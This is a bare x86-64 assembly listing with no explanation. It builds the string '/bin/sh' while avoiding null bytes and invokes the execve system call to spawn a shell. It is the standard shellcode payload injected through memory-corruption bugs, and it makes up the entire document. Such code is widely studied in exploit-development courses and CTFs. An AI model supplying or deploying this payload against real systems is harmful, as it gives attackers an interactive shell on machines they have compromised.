global _start

section .text

_start:
    xor     rax, rax
    mov     qword rbx, '//bin/sh'
    shr     rbx, 0x8
    push    rbx
    mov     rdi, rsp
    push    rax
    push    rdi
    mov     rsi, rsp
    mov     rdx, rax
    add     rax, 0x3b
    syscall